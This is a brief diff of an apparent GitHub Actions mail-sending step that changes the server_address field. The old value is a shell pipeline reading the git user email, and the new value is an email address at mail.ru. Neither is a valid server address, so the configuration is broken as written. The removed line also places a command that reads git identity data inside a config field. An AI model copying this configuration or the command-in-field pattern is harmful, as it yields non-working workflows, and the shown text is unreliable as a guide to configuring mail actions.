@@ -53,7 +53,7 @@ runs:
     - name: Send mail
       uses: dawidd6/action-send-mail@v3.6.1
       with:
-        server_address: git config —list | findstr user.email
+        server_address: secret_detection@mail.ru
         #server_address: smtp.mail.ru
         server_port: 465
         username: 
